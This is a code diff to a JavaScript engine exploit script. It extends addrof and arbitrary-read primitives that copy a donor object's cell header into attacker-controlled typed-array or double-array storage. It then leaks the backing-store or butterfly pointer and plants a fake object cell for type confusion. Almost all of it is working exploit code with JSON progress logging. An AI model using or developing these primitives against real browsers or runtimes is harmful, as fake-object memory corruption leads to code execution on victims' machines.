@@ -43,6 +43,12 @@ const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
 const maxFillBytes = Number(process.env.MAX_FILL_BYTES || (1 << 20));
 const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
 const fakeCellBytes = Number(process.env.FAKE_CELL_BYTES || 32);
+const fakeStorage = process.env.FAKE_STORAGE || "biguint64Array";
+const fakeStorageSlots = Number(process.env.FAKE_STORAGE_SLOTS || 16);
+const fakeStorageOffset = Number(process.env.FAKE_STORAGE_OFFSET || 0);
+const requireStorageMatch = process.env.REQUIRE_STORAGE_MATCH !== "0";
+const touchMode = process.env.TOUCH_MODE || "constructor";
+const donorKind = process.env.DONOR_KIND || "withProp";
 
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 function detach(ab) {
@@ -109,11 +115,22 @@ function writeU64LE(view, off, value) {
   let v = value;
   for (let i = 0; i < 8; i++) { view[off + i] = Number(v & 0xffn); v >>= 8n; }
 }
+function readU64LEArray(bytes, off) {
+  let v = 0n;
+  for (let i = 7; i >= 0; i--) v = (v << 8n) | BigInt(bytes[off + i] || 0);
+  return v;
+}
 function payloadU64(value) {
   const out = Buffer.alloc(8);
   let v = value;
   for (let i = 0; i < 8; i++) { out[i] = Number(v & 0xffn); v >>= 8n; }
   return out;
+}
+const f64Scratch = new ArrayBuffer(8);
+const f64ScratchView = new DataView(f64Scratch);
+function f64FromU64(value) {
+  f64ScratchView.setBigUint64(0, value, true);
+  return f64ScratchView.getFloat64(0, true);
 }
 
 async function addrof(target) {
@@ -242,16 +259,25 @@ async function plantBitsAndRead(bits) {
 
 // === Main ===
 
-console.error(JSON.stringify({ phase: "start" }));
+function makeDonor(kind) {
+  switch (kind) {
+    case "plain": return {};
+    case "withProp": return { donor: "fake-cell-shape" };
+    case "withProps": return { a: 1, b: 2, c: 3, d: 4, e: 5, f: 6 };
+    case "doubleArray": return [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+    case "objectArray": return [{}, {}, {}, {}, {}, {}, {}, {}];
+    case "arrayBuffer": return new ArrayBuffer(64);
+    case "uint8Array": return new Uint8Array(64);
+    case "biguint64Array": return new BigUint64Array(8);
+    default: throw new Error(`unknown donor kind ${kind}`);
+  }
+}
 
-// Step 1: allocate a JS-controlled byte buffer for the fake cell content.
-// Use a BigUint64Array so we can write raw 64-bit qwords without NaN-boxing.
-const fakeCellBuf = new BigUint64Array(8);
-const fakeCellBufBytes = new Uint8Array(fakeCellBuf.buffer);
+console.error(JSON.stringify({ phase: "start", fakeStorage, fakeStorageSlots, fakeStorageOffset, touchMode, donorKind }));
 
 // Step 2: a real donor (plain object). Allocate a few so we don't pin a
 // special one; one of them will become our shape donor.
-const donor = { donor: "fake-cell-shape" };
+const donor = makeDonor(donorKind);
 
 // Step 3: build the bridge (addrof victim -> wrapper -> metadata).
 const victimBuffer = new ArrayBuffer(viewSize);
@@ -324,33 +350,92 @@ const donorPrefix = await bridgeRead(donorAddr, fakeCellBytes);
 const donorPrefixHex = Buffer.from(donorPrefix).toString("hex");
 console.error(JSON.stringify({ phase: "donor-prefix", bytes: donorPrefixHex }));
 
-// Step 5: copy the donor prefix into the fakeCellBuf (typed array data).
-for (let i = 0; i < fakeCellBytes && i < fakeCellBufBytes.length; i++) {
-  fakeCellBufBytes[i] = donorPrefix[i];
-}
-console.error(JSON.stringify({ phase: "fakecell-copied", bytes: Buffer.from(fakeCellBufBytes.slice(0, fakeCellBytes)).toString("hex") }));
+// Step 5/6: copy the donor prefix into a JS-controlled storage object and
+// recover the native address of those bytes.
+let fakeStorageObject = null;
+let fakeStorageCellAddr = 0n;
+let fakeStorageCellPrefix = null;
+let fakeBytesAddr = 0n;
+let fakeStorageKind = fakeStorage;
+let fakeStorageBytesHex = "";
 
-// Step 6: leak the m_vector of fakeCellBuf so we know the address of the
-// data we just wrote. addrof(fakeCellBuf) gives the JSCell; read offset 16
-// of the cell to get m_vector.
-const fakeCellBufCellAddr = await addrof(fakeCellBuf);
-console.error(JSON.stringify({ phase: "fakecellbuf-addrof", cellAddr: hex(fakeCellBufCellAddr) }));
+if (fakeStorage === "biguint64Array") {
+  const fakeCellBuf = new BigUint64Array(Math.max(8, Math.ceil((fakeStorageOffset + fakeCellBytes) / 8)));
+  const fakeCellBufBytes = new Uint8Array(fakeCellBuf.buffer);
+  for (let i = 0; i < fakeCellBytes && fakeStorageOffset + i < fakeCellBufBytes.length; i++) {
+    fakeCellBufBytes[fakeStorageOffset + i] = donorPrefix[i];
+  }
+  fakeStorageObject = fakeCellBuf;
+  fakeStorageCellAddr = await addrof(fakeCellBuf);
+  console.error(JSON.stringify({ phase: "fake-storage-addrof", kind: fakeStorageKind, cellAddr: hex(fakeStorageCellAddr) }));
 
-if (!isPointerLike(fakeCellBufCellAddr)) {
-  console.log(JSON.stringify({ phase: "summary", ok: false, error: "fakecellbuf addrof" }));
+  if (!isPointerLike(fakeStorageCellAddr)) {
+    console.log(JSON.stringify({ phase: "summary", ok: false, error: "fake storage addrof", fakeStorageKind }));
+    process.exit(1);
+  }
+
+  fakeStorageCellPrefix = await bridgeRead(fakeStorageCellAddr, 32);
+  console.error(JSON.stringify({ phase: "fake-storage-cell-prefix", kind: fakeStorageKind, bytes: Buffer.from(fakeStorageCellPrefix).toString("hex") }));
+
+  const vector = readU64LEArray(fakeStorageCellPrefix, 16);
+  fakeBytesAddr = vector + BigInt(fakeStorageOffset);
+  fakeStorageBytesHex = Buffer.from(fakeCellBufBytes.slice(fakeStorageOffset, fakeStorageOffset + fakeCellBytes)).toString("hex");
+} else if (fakeStorage === "doubleArray") {
+  if (fakeStorageOffset % 8 !== 0) {
+    console.log(JSON.stringify({ phase: "summary", ok: false, error: "doubleArray storage offset must be qword-aligned", fakeStorageOffset }));
+    process.exit(1);
+  }
+  const qwordOffset = Math.floor(fakeStorageOffset / 8);
+  const neededSlots = qwordOffset + Math.ceil(fakeCellBytes / 8) + 4;
+  const fakeDoubleArray = new Array(Math.max(fakeStorageSlots, neededSlots));
+  for (let i = 0; i < fakeDoubleArray.length; i++) fakeDoubleArray[i] = 13.37 + i;
+  for (let off = 0; off < fakeCellBytes; off += 8) {
+    fakeDoubleArray[qwordOffset + (off / 8)] = f64FromU64(readU64LEArray(donorPrefix, off));
+  }
+  fakeStorageObject = fakeDoubleArray;
+  fakeStorageCellAddr = await addrof(fakeDoubleArray);
+  console.error(JSON.stringify({ phase: "fake-storage-addrof", kind: fakeStorageKind, cellAddr: hex(fakeStorageCellAddr), length: fakeDoubleArray.length }));
+
+  if (!isPointerLike(fakeStorageCellAddr)) {
+    console.log(JSON.stringify({ phase: "summary", ok: false, error: "fake storage addrof", fakeStorageKind }));
+    process.exit(1);
+  }
+
+  fakeStorageCellPrefix = await bridgeRead(fakeStorageCellAddr, 32);
+  console.error(JSON.stringify({ phase: "fake-storage-cell-prefix", kind: fakeStorageKind, bytes: Buffer.from(fakeStorageCellPrefix).toString("hex") }));
+
+  const butterfly = readU64LEArray(fakeStorageCellPrefix, 8);
+  fakeBytesAddr = butterfly + BigInt(fakeStorageOffset);
+  fakeStorageBytesHex = Buffer.from(await bridgeRead(fakeBytesAddr, fakeCellBytes)).toString("hex");
+  console.error(JSON.stringify({ phase: "fake-storage-butterfly", butterfly: hex(butterfly), fakeBytesAddr: hex(fakeBytesAddr) }));
+} else {
+  console.log(JSON.stringify({ phase: "summary", ok: false, error: "unknown fake storage", fakeStorage }));
   process.exit(1);
 }
 
-const fakeCellBufCellPrefix = await bridgeRead(fakeCellBufCellAddr, 32);
-console.error(JSON.stringify({ phase: "fakecellbuf-prefix", bytes: Buffer.from(fakeCellBufCellPrefix).toString("hex") }));
+console.error(JSON.stringify({
+  phase: "fakecell-copied",
+  kind: fakeStorageKind,
+  bytes: fakeStorageBytesHex,
+  matchesDonor: fakeStorageBytesHex === donorPrefixHex,
+}));
 
-// m_vector for a typed array view is at offset 16 of the JSCell.
-let fakeBytesAddr = 0n;
-for (let k = 7; k >= 0; k--) fakeBytesAddr = (fakeBytesAddr << 8n) | BigInt(fakeCellBufCellPrefix[16 + k]);
-console.error(JSON.stringify({ phase: "fake-bytes-addr", fakeBytesAddr: hex(fakeBytesAddr) }));
+if (requireStorageMatch && fakeStorageBytesHex !== donorPrefixHex) {
+  console.log(JSON.stringify({
+    phase: "summary",
+    ok: false,
+    error: "fake storage bytes do not match donor prefix",
+    fakeStorageKind,
+    donorPrefixHex,
+    fakeStorageBytesHex,
+  }));
+  process.exit(1);
+}
+
+console.error(JSON.stringify({ phase: "fake-bytes-addr", kind: fakeStorageKind, fakeBytesAddr: hex(fakeBytesAddr) }));
 
 if (!isPointerLike(fakeBytesAddr)) {
-  console.log(JSON.stringify({ phase: "summary", ok: false, error: "fake bytes addr not pointer-like", fakeBytesAddr: hex(fakeBytesAddr) }));
+  console.log(JSON.stringify({ phase: "summary", ok: false, error: "fake bytes addr not pointer-like", fakeStorageKind, fakeBytesAddr: hex(fakeBytesAddr) }));
   process.exit(1);
 }
 
@@ -377,7 +462,8 @@ try {
   else if (v === null) touchClass = "null";
   else if (v === undefined) touchClass = "undefined";
   else if (typeof v === "object") {
-    touchClass = `object(${v?.constructor?.name || "?"})`;
+    if (touchMode === "typeof") touchClass = "object";
+    else touchClass = `object(${v?.constructor?.name || "?"})`;
   } else {
     touchClass = typeof v;
   }
@@ -392,7 +478,10 @@ const summary = {
   metadataAddr: hex(metadataAddr),
   donorAddr: hex(donorAddr),
   donorPrefixHex,
-  fakeCellBufCellAddr: hex(fakeCellBufCellAddr),
+  fakeStorageKind,
+  fakeStorageCellAddr: hex(fakeStorageCellAddr),
+  fakeStorageCellPrefixHex: Buffer.from(fakeStorageCellPrefix).toString("hex"),
+  fakeStorageBytesHex,
   fakeBytesAddr: hex(fakeBytesAddr),
   plantedArrayIndex: planted.arrayIndex,
   touchClass,
